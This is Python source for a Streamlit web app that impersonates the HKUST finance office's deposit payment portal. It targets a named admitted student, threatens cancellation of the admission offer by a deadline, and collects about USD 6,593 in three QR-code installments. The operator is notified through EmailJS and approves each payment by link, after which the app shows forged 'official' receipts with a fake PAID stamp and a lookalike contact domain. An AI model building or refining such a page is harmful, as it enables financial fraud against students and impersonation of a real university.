import streamlit as st
import base64
import os
import time
from datetime import datetime
import requests

# --- 1. Page Config & Professional Styling ---
st.set_page_config(page_title="HKUST Deposit System", page_icon="✅", layout="wide")

def get_base64_bin_file(bin_file):
    if os.path.exists(bin_file):
        with open(bin_file, 'rb') as f:
            data = f.read()
        return base64.b64encode(data).decode()
    return None

# Load Local Logo
logo_base64 = get_base64_bin_file("hkust.png")
STAMP_DATE = datetime.now().strftime('%d %B %Y').upper()

# --- 2. Full English CSS Injection ---
st.markdown(f"""
<style>
/* Hide official Streamlit elements */
#MainMenu, header, footer, .stDeployButton {{visibility: hidden !important;}}
[data-testid="stHeader"] {{display: none !important;}}

/* Top Navigation Bar */
.nav-bar {{
    background-color: #003366; padding: 10px 60px; display: flex; align-items: center; color: white;
    border-bottom: 4px solid #A6937C; margin: -75px -100px 30px -100px;
}}
.nav-logo {{ height: 85px; width: auto; margin-right: 25px; mix-blend-mode: screen; display: block; }}
.system-title {{ border-left: 2px solid #fff; padding-left: 20px; font-size: 20px; font-weight: 500; line-height: 1.2; }}

/* Card & Box Styles */
.payment-card {{ background: white; padding: 35px; border-radius: 10px; border: 1px solid #ddd; color: #000 !important; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }}
.deadline-box {{ color: #d32f2f !important; font-weight: bold; font-size: 16px; background-color: #f8d7da !important; padding: 18px; border-radius: 4px; margin: 15px 0; border: 1px solid #f5c6cb; line-height: 1.6; }}
.info-box {{ background-color: #fffbe6; border: 1px solid #ffe58f; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; color: #856404; }}

/* Official Receipt Styles */
.receipt-box {{
    background: white; border: 1px solid #003366; padding: 45px; max-width: 800px; margin: auto;
    font-family: 'Arial', sans-serif; position: relative; color: #333 !important;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
}}
.receipt-header {{ text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px; }}
.info-row {{ display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; font-size: 15px; }}

/* Blue Official Round Stamp */
.official-stamp {{
    position: absolute; bottom: 45px; right: 50px; width: 145px; height: 145px;
    border: 3px double #1a478a; border-radius: 50%; color: #1a478a;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    text-align: center; font-family: 'Courier New', Courier, monospace;
    font-weight: bold; transform: rotate(-10deg); opacity: 0.85;
    background: rgba(26, 71, 138, 0.02); pointer-events: none;
}}
.stamp-inner-circle {{ position: absolute; width: 115px; height: 115px; border: 1.5px solid #1a478a; border-radius: 50%; }}
.stamp-paid {{ font-size: 24px; border-top: 2px solid #1a478a; border-bottom: 2px solid #1a478a; padding: 2px 6px; margin: 3px 0; }}

/* Animation */
.loader {{ border: 6px solid #f3f3f3; border-top: 6px solid #003366; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }}
@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
</style>
""", unsafe_allow_html=True)

# --- 3. Status Management ---
STATUS_FILE = "payment_status.txt"
def set_status(s):
    with open(STATUS_FILE, "w") as f: f.write(s)
def get_status():
    if not os.path.exists(STATUS_FILE): return "pending"
    with open(STATUS_FILE, "r") as f: return f.read().strip()

# Handle Admin Approval Link
q = st.query_params
if q.get("action") in ["approve1", "approve2", "approve3"]:
    set_status(q.get("action").replace("approve", "approved"))
    st.success("Payment Confirmed! Screen updating...")
    st.stop()

# Data Config
PAYER = "XINGSHENG WANG"
HKD_TOTAL = "51,643"
USD_TOTAL = "6,593.21"

# EmailJS Config (Ensure these are replaced with your IDs)
USER_ID = "2Mp8IGmfTvvDLueQN"
SERVICE_ID = "service_hjp7b95"
TEMPLATE_ID = "template_6sdyg2j"
MY_URL = "https://hkust-pre-of-tpg.streamlit.app" 

if 'step' not in st.session_state: st.session_state.step = "pay1"

# --- 4. Render Navigation Bar ---
logo_html = f'<img src="data:image/png;base64,{logo_base64}" class="nav-logo">' if logo_base64 else ""
st.markdown(f"""
<div class="nav-bar">
    {logo_html}
    <div class="system-title">Deposit System<br><span style="font-size:12px; font-weight:normal;">Official Online Payment Portal</span></div>
</div>
""", unsafe_allow_html=True)

# --- 5. Content Logic (STRICT ENGLISH) ---

# Checking Animation
if st.session_state.step.startswith("checking"):
    stage = st.session_state.step[-1]
    st.markdown(f"""
    <div style="text-align:center; margin-top:100px;">
        <div class="loader"></div>
        <h2 style="color:#003366;">Verifying Transaction...</h2>
        <p>Finance Office is currently verifying installment {stage} via Payoneer settlement system.</p>
    </div>
    """, unsafe_allow_html=True)
    time.sleep(5)
    if get_status() == f"approved{stage}":
        st.session_state.step = f"receipt{stage}"
    st.rerun()

# Stage 1: USD 1,200
elif st.session_state.step == "pay1":
    col1, col2, col3 = st.columns([1, 1.8, 1])
    with col2:
        st.markdown(f"""<div class="payment-card">
<h3 style="color:#003366; margin-top:0;">Payment Plan Confirmation</h3>
<p style="color:#333;"><b>Payer Name:</b> {PAYER}</p>
<p>Your deposit of <b>HK$ {HKD_TOTAL}</b> (≈ <b>USD {USD_TOTAL}</b>) will be split into 3 installments for secure transit.</p>
<div class="info-box"><b>Installment Plan:</b> 1st: $1,200 | 2nd: $3,000 | 3rd: $2,393.21</div>
<div class="deadline-box">
⚠️ URGENT NOTICE:<br>
Please complete the payment by 4:00 PM on April 24th. Failure to do so will result in the immediate cancellation of your admission offer and TLE MSc program seat.
</div>
<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Current Action: 1st Installment - USD 1,200.00</p>
</div>""", unsafe_allow_html=True)
        st.image("qr1.png" if os.path.exists("qr1.png") else "https://placeholder.com", width=400)
        if st.button("I HAVE PAID THE 1ST INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 1200", "approve_url": f"{MY_URL}/?action=approve1"}})
            set_status("checking1"); st.session_state.step = "checking1"; st.rerun()

# Official Receipt Display (with contact info & stamp)
elif st.session_state.step in ["receipt1", "receipt2", "receipt3"]:
    stage_num = st.session_state.step[-1]
    amounts = {"1": "1,200.00", "2": "3,000.00", "3": "2,393.21"}
    is_final = (stage_num == "3")
    
    st.markdown(f"""
    <div class="receipt-box">
        <div class="receipt-header">
            <h2 style="margin:0; color:#003366;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
            <p style="font-size:12px; margin-top:5px; color:#666;">Clear Water Bay, Kowloon, Hong Kong | Finance Office</p>
        </div>
        <h3 style="text-align:center; text-decoration: underline; color:#333;">OFFICIAL ELECTRONIC RECEIPT</h3>
        <div class="info-row"><span><b>Receipt No:</b></span><span>UST-{int(time.time())}</span></div>
        <div class="info-row"><span><b>Date:</b></span><span>{datetime.now().strftime('%d %B %Y')}</span></div>
        <div class="info-row"><span><b>Received From:</b></span><span>{PAYER}</span></div>
        <div class="info-row"><span><b>Payment Type:</b></span><span>{"Full Program Deposit" if is_final else f"Installment {stage_num}"}</span></div>
        <div class="info-row" style="border-top:2px solid #003366; margin-top:10px;">
            <span><b>AMOUNT RECEIVED:</b></span>
            <span style="font-size:18px; color:#003366;"><b>USD {amounts[stage_num]}</b></span>
        </div>
        
        <div style="margin-top:40px; border-top: 1px dashed #eee; padding-top:15px;">
            <p style="font-size:12px; color:#666; margin-bottom:5px;"><b>Notes:</b> This is a computer-generated document. No signature is required.</p>
            <p style="font-size:13px; color:#333;">For any inquiries, please contact: <a href="mailto:uagdmit@hkust-tle.hk" style="color:#003366; text-decoration:none;"><b>uagdmit@hkust-tle.hk</b></a></p>
        </div>
        
        <div class="official-stamp">
            <div class="stamp-inner-circle"></div>
            <div style="font-size: 11px; margin-bottom: 2px;">HKUST</div>
            <div class="stamp-paid">PAID</div>
            <div style="font-size: 13px; margin: 2px 0;">{STAMP_DATE}</div>
            <div style="font-size: 9px;">FINANCE OFFICE</div>
        </div>
    </div>
    """, unsafe_allow_html=True)
    
    st.write("## ")
    if stage_num == "1":
        if st.button("PROCEED TO 2ND INSTALLMENT (USD 3,000)", use_container_width=True, type="primary"):
            st.session_state.step = "pay2"; st.rerun()
    elif stage_num == "2":
        if st.button("PROCEED TO FINAL INSTALLMENT (USD 2,393.21)", use_container_width=True, type="primary"):
            st.session_state.step = "pay3"; st.rerun()
    else:
        st.balloons()
        st.success("All installments completed. Your admission place is secured.")

# Stage 2 & 3 Pay Pages (Pure English)
elif st.session_state.step == "pay2":
    col1, col2, col3 = st.columns([1, 1.8, 1])
    with col2:
        st.markdown(f'<div class="payment-card"><h3 style="color:#003366; margin-top:0;">2nd Installment Payment</h3><p>Payer: {PAYER}</p><div class="deadline-box">⚠️ Deadline Reminder: 4:00 PM, April 24th.</div><p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:20px;">Amount: USD 3,000.00</p></div>', unsafe_allow_html=True)
        st.image("qr2.png", width=400)
        if st.button("I HAVE PAID THE 2ND INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 3000", "approve_url": f"{MY_URL}/?action=approve2"}})
            set_status("checking2"); st.session_state.step = "checking2"; st.rerun()

elif st.session_state.step == "pay3":
    col1, col2, col3 = st.columns([1, 1.8, 1])
    with col2:
        st.markdown(f'<div class="payment-card"><h3 style="color:#003366; margin-top:0;">Final Installment Payment</h3><p>Payer: {PAYER}</p><div class="deadline-box">⚠️ Final Step: Complete this to secure your offer.</div><p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:20px;">Amount: USD 2,393.21</p></div>', unsafe_allow_html=True)
        st.image("qr3.png", width=400)
        if st.button("I HAVE PAID THE FINAL INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 2393.21", "approve_url": f"{MY_URL}/?action=approve3"}})
            set_status("checking3"); st.session_state.step = "checking3"; st.rerun()

# Footer
st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
